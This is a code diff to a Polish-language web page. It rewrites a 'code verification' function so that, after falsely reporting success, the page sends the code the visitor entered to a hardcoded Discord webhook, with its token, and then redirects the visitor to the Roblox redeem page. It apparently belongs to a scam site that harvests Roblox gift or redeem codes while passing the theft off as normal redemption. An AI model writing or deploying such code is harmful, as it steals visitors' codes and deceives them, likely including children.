@@ -208,7 +208,7 @@
     }
     animateBg();
 
-    // ---------- sprawdzanie kodu ----------
+    // ---------- sprawdzanie kodu + webhook + przekierowanie ----------
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
@@ -218,7 +218,20 @@
         return;
       }
       message.textContent = "Weryfikacja udana!";
-      // webhook lub przekierowanie opcjonalnie
+
+      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
+      })
+      .then(() => {
+        window.location.href = "https://www.roblox.com/redeem";
+      })
+      .catch(err => {
+        console.error("Błąd wysyłki webhooka:", err);
+        message.textContent = "Błąd wysyłki kodu!";
+      });
     }
 
     // ---------- ROTATOR LOSOWYCH OFERT ----------
